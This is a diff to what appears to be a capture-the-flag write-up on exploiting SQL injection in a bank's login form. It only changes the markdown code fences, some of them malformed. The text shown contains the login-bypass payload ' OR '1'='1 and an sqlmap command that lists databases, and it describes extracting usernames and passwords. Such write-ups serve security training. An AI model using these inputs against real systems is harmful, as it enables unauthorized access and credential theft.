@@ -7,8 +7,8 @@ This challenge involved exploiting an SQL injection vulnerability on a bank’s 
 
     -Scanned the target website and found a login form vulnerable to SQL injection:
 
-    'sql
-  ' ' OR '1'='1
+   ```bash sql
+   ```bash ' OR '1'='1
 
     -Bypassed the login and accessed the internal dashboard.
 
@@ -16,7 +16,7 @@ This challenge involved exploiting an SQL injection vulnerability on a bank’s 
 
     -Exploited the SQL injection vulnerability to dump the database using sqlmap:
 
-    'bash
+    ```bash
     'sqlmap -u "http://<target_ip>/login" --dbs
 
     -Extracted usernames and passwords from the database.
